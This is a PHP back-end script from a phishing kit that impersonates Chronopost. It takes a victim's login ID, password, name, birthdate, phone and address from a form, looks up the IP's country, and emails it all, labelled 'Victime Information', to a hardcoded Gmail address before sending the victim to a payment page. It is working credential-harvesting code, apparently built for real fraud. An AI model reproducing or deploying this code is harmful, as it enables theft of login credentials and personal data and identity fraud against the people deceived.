<?php
session_start();

include "email.php";
$xsam = getenv("REMOTE_ADDR");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
// --------------- VRB
$mada1 = $_POST['user_id'];
$mada2 = $_POST['password'];
$mada3 = $_POST['lastname'];
$mada4 = $_POST['firstname'];
$mada5 = $_POST['birthdate'];
$mada6 = $_POST['phone'];
$masa1 = $_POST['address'];
$masa2 = $_POST['city'];
$masa3 = $_POST['zip_code'];

// --------------- VRB
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$msg = "
<html>
    <head>
<style>
*{
font-family:arial;
}
table{
width: 100%;
}
strong{
color: #f91010;
}
</style>
</head>
<table style='width:100%;'>
<tr>
<td style='padding: 3%;background: #79e5d8;color: #00B0FF;border-bottom: solid;'>
<strong style='color:#f91010;'><center> | Chronopost |</center></strong>
</td>
</tr>
<tr>
<td style='padding: 3%;background: #e9e9e9;color: #00B0FF;border-bottom: solid;font-weight: bold;'>
<h2>Personnel Information</h2>
<p>Nom : <strong style='color:#f91010;'>".$mada3."</strong></p>
<p>Prenom  : <strong style='color:#f91010;'>".$mada4."</strong></p>
<p>date de naissance : <strong style='color:#f91010;'>".$mada5."</strong></p>
<p>Telephone  : <strong style='color:#f91010;'>".$mada6."</strong></p>
<p>Adresse : <strong style='color:#f91010;'>".$masa1."</strong></p>
<p>Ville  : <strong style='color:#f91010;'>".$masa2."</strong></p>
<p>Code postale : <strong style='color:#f91010;'>".$masa3."</strong></p>
<h2>Victime Information</h2>
<hr>
<p>IP ADD : <strong style='color:#f91010;'>".$ip."</strong></p>
<p>USER AGENT : <strong style='color:#f91010;'>".$browser."</strong></p>
<br />
||~~ BY ~~ King ~~||
<br />
";
$Subject = "Chronopost  ~ Info ~ From ~ [$ip] Country [$COUNTRY]";
$Headers = "From: Chronopost <oreoo.net>\r\n";
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$email = "ewalilo.matkhafch@gmail.com";
mail($email,$Subject,$msg,$Headers);
header ('Location: ./paiement.html');


?>